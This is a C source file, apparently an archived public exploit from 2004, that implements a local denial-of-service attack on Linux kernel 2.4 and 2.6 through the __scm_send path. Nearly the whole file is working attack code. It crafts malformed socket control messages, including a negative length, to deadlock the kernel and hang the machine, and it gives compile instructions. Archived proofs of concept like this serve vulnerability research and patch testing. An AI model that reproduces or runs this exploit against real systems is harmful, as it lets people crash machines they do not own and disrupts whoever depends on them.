/*
*      Linux kernel 2.4 & 2.6 __scm_send DoS
*      Warning! this code will hang your machine
*
*      gcc -O2 scmbang.c -o scmbang
*
*      Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
*
*      THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
*      AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
*      WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static char buf[1024];

void
fatal (const char *msg)
{
   printf ("\n");
   if (!errno)
     {
         fprintf (stderr, "FATAL: %s\n", msg);
     }
   else
     {
         perror (msg);
     }
   printf ("\n");
   fflush (stdout);
   fflush (stderr);
   exit (1);
}

int
main (void)
{
   int s[2], r;
   struct sockaddr_in sin;
   struct msghdr *msg;
   struct cmsghdr *cmsg;

   r = socketpair (AF_UNIX, SOCK_DGRAM, 0, s);
   if (r < 0)
       fatal ("socketpair");

   memset (buf, 0, sizeof (buf));
   msg = (void *) buf;
   msg->msg_control = (void *) (msg + 1);

// make bad cmsgs
   cmsg = (void *) msg->msg_control;

   cmsg->cmsg_len = sizeof (*cmsg);
   cmsg->cmsg_level = 0xdeadbebe;
   cmsg->cmsg_type = 12;       // len after overflow on second msg
   cmsg++;

// -12 for deadlock
   cmsg->cmsg_len = -12;
   cmsg->cmsg_level = SOL_IP;
   msg->msg_controllen = (unsigned) (cmsg + 1) - (unsigned) msg->msg_control;
   r = sendmsg (s[0], msg, 0);
   if (r < 0)
       fatal ("sendmsg");

   printf ("\nYou lucky\n");
   fflush (stdout);

   return 0;
}

// milw0rm.com [2004-12-14]